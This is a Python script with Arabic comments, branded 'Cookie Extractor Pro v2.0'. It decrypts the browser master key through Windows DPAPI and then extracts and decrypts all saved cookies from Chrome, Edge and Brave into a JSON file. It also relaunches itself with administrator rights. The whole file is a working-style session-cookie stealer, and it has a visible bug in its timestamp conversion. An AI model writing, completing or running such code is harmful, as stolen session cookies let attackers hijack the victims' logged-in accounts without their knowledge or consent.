import os
import sys
import shutil
import sqlite3
import json
import base64
import ctypes
from datetime import datetime

# --- مكتبات مطلوبة يجب تثبيتها ---
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress
from Crypto.Cipher import AES
import win32crypt # يتطلب pypiwin32

# ==============================================================================
# الإعدادات الرئيسية
# ==============================================================================
OUTPUT_FILE = "cookies_results.json"
BROWSERS = {
    'chrome': os.path.join(os.getenv('LOCALAPPDATA', ''), 'Google', 'Chrome', 'User Data'),
    'edge': os.path.join(os.getenv('LOCALAPPDATA', ''), 'Microsoft', 'Edge', 'User Data'),
    'brave': os.path.join(os.getenv('LOCALAPPDATA', ''), 'BraveSoftware', 'Brave-Browser', 'User Data'),
}

console = Console()

# ==============================================================================
# وظائف مساعدة
# ==============================================================================
def is_admin():
    """التحقق من صلاحيات المسؤول"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    """محاولة إعادة تشغيل البرنامج بصلاحيات المسؤول"""
    if sys.platform == 'win32':
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)

def get_master_key(browser_path):
    """استخراج مفتاح التشفير الرئيسي من ملف Local State"""
    local_state_path = os.path.join(browser_path, 'Local State')
    if not os.path.exists(local_state_path):
        return None
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:] # إزالة 'DPAPI'
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

def decrypt_data(data, master_key):
    """فك تشفير البيانات (الكوكيز) باستخدام المفتاح الرئيسي"""
    try:
        iv = data[3:15]
        payload = data[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        return decrypted_pass[:-16].decode()
    except:
        return "Decryption Failed"

# ==============================================================================
# الوظيفة الرئيسية لاستخراج الكوكيز
# ==============================================================================
def extract_cookies(browser_name, browser_path, progress, task_id):
    """
    الوظيفة الأساسية التي تبحث عن الكوكيز وتفك تشفيرها لمتصفح معين.
    """
    total_cookies_found = 0
    default_profile_path = os.path.join(browser_path, 'Default')
    cookies_db_path = os.path.join(default_profile_path, 'Network', 'Cookies')
    
    progress.update(task_id, description=f"[cyan]فحص [bold]{browser_name}[/bold]...")

    if not os.path.exists(browser_path) or not os.path.exists(cookies_db_path):
        progress.update(task_id, description=f"[yellow]متصفح [bold]{browser_name}[/bold] غير موجود أو فارغ.", advance=100)
        return []

    master_key = get_master_key(browser_path)
    if not master_key:
        progress.update(task_id, description=f"[red]فشل الحصول على مفتاح [bold]{browser_name}[/bold].", advance=100)
        return []

    # نسخ ملف الكوكيز لتجنب قفل قاعدة البيانات
    temp_db_path = os.path.join(os.getenv('TEMP'), f'cookies_db_{browser_name}.db')
    shutil.copy2(cookies_db_path, temp_db_path)
    progress.update(task_id, advance=30)

    all_cookies = []
    try:
        conn = sqlite3.connect(temp_db_path)
        cursor = conn.cursor()
        cursor.execute('SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies')
        
        for host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly in cursor.fetchall():
            decrypted_value = decrypt_data(encrypted_value, master_key)
            if decrypted_value != "Decryption Failed":
                all_cookies.append({
                    'browser': browser_name,
                    'host': host_key,
                    'name': name,
                    'value': decrypted_value,
                    'path': path,
                    'expires_utc': str(datetime(1601, 1, 1) + datetime.timedelta(microseconds=expires_utc)),
                    'is_secure': bool(is_secure),
                    'is_httponly': bool(is_httponly),
                })
                total_cookies_found += 1
        
        conn.close()
        os.remove(temp_db_path) # حذف الملف المؤقت

    except Exception as e:
        progress.update(task_id, description=f"[red]خطأ في قراءة ملفات [bold]{browser_name}[/bold]: {e}", advance=100)
        return []
        
    progress.update(task_id, description=f"[green]تم العثور على {total_cookies_found} كوكي من [bold]{browser_name}[/bold].", advance=70)
    return all_cookies


# ==============================================================================
# نقطة بداية البرنامج
# ==============================================================================
def main():
    """نقطة انطلاق البرنامج الرئيسية"""
    
    console.print(Panel.fit("""
[bold green]🍪 Cookie Extractor Pro v2.0 🍪[/bold]
[cyan]برنامج احترافي لاستخراج الكوكيز من المتصفحات[/cyan]
    """, title="[yellow]Welcome[/yellow]"))

    if not is_admin():
        console.print("[bold red]خطأ: صلاحيات المسؤول مطلوبة للوصول إلى ملفات المتصفحات.[/bold]")
        console.print("[yellow]سيتم محاولة إعادة تشغيل البرنامج بصلاحيات المسؤول...[/yellow]")
        run_as_admin()
        sys.exit()

    final_results = []
    console.print("\n[bold cyan]ملاحظة: للحصول على أفضل النتائج، يرجى إغلاق جميع المتصفحات.[/bold]\n")

    with Progress(console=console) as progress:
        overall_task = progress.add_task("[bold blue]جاري استخراج الكوكيز...", total=len(BROWSERS))

        for name, path in BROWSERS.items():
            browser_task = progress.add_task(f"[cyan]فحص {name}...", total=100)
            cookies = extract_cookies(name, path, progress, browser_task)
            final_results.extend(cookies)
            progress.update(overall_task, advance=1)
            
    if final_results:
        with open(OUTPUT_FILE, 'w', encoding='utf-8') as f:
            json.dump(final_results, f, indent=4, ensure_ascii=False)
        
        console.print(f"\n[bold green]🎉 نجاح! تم العثور على ما مجموعه {len(final_results)} كوكي.[/bold]")
        console.print(f"[bold green]✅ تم حفظ جميع النتائج في الملف: [cyan]{OUTPUT_FILE}[/cyan][/bold]")
    else:
        console.print("\n[bold yellow]لم يتم العثور على أي كوكيز. تأكد من أن لديك متصفحات (Chrome, Edge, Brave) مثبتة وقمت بتسجيل الدخول إلى بعض المواقع.[/bold]")
    
    console.print("\n[dim]اضغط Enter للخروج...[/dim]")
    input()


if __name__ == '__main__':
    main()
